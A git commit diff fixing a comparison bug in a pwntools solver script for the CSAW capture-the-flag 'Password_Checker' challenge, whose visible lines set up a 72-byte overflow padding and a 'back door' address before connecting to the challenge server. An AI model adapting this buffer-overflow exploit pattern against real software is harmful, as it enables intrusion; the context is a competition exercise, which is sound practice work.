a87ffe692e57905715415add0fe5af8c6240d102
M-Pepper <46696465+M-Pepper@users.noreply.github.com>
2021-09-12 09:40:41 -0400

    Update solver.py

--- warm-up/Password_Checker/solver.py
+++ warm-up/Password_Checker/solver.py
@@ -12,7 +12,7 @@ log.info(f"back door sanity check after packing and unpacking @ {hex(u64(back_do
 OFFSET = 72
 junk = b"A" * OFFSET
 
-if LOCAL = False:
+if LOCAL == False:
     p = remote('pwn.chal.csaw.io', 5000, ssl=False)
 else:
     p = process('/home/mckenziepepper/Documents/b0f-chals/CSAW/password_checker')
